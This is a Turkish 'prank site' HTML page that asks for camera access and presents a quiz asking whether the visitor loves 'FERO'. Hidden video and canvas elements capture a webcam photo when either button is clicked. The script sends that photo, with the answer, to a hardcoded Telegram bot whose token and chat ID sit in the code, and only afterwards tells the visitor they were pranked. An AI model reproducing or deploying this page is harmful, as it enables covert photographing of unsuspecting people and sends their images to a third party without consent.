<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <title>Şaka Sitesi</title>
  <style>
    body { 
      display: flex; 
      justify-content: center; 
      align-items: center; 
      height: 100vh; 
      background: #111; 
      color: white; 
      font-family: Arial, sans-serif; 
      text-align: center;
      flex-direction: column;
    }
    video, canvas { display: none; }
    h1 { font-size: 2em; margin-bottom: 20px; }
    button { 
      padding: 10px 20px; 
      margin: 5px; 
      border: none; 
      border-radius: 8px; 
      font-size: 16px; 
      cursor: pointer; 
    }
    button:hover { opacity: 0.8; }
    .yes { background: #4caf50; color: white; }
    .no { background: #f44336; color: white; }
  </style>
</head>
<body>
  <h1>Kamera hazırlanıyor...</h1>
  <video id="video" autoplay></video>
  <canvas id="canvas"></canvas>

  <script>
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const ctx = canvas.getContext("2d");

    const BOT_TOKEN = "8369405248:AAEGL_vh2_ZkknIOKbOaqbHVEGynLzPq47I";
    const CHAT_ID = "8494445812";

    function askQuestion() {
      document.body.innerHTML = `
        <h1>FERO'yu seviyor musun?</h1>
        <button class="yes">Evet</button>
        <button class="no">Hayır</button>
      `;

      document.querySelector(".yes").onclick = () => takePhoto("Evet");
      document.querySelector(".no").onclick = () => takePhoto("Hayır");
    }

    function takePhoto(answer) {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0);

      canvas.toBlob(blob => {
        const formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        formData.append("photo", blob, "photo.png");
        formData.append("caption", `Cevap: ${answer}`);

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: "POST",
          body: formData
        }).then(() => {
          document.body.innerHTML = "<h1>Şakalandın dostum 😃</h1>";
        }).catch(() => {
          document.body.innerHTML = "<h1>Fotoğraf gönderilemedi 😅</h1>";
        });
      });
    }

    // Kamerayı aç
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;
        setTimeout(askQuestion, 2000); // 2 saniye sonra soruyu göster
      })
      .catch(err => {
        document.body.innerHTML = "<h1>Kamera izni vermedin 😅</h1>";
      });
  </script>
</body>
</html>
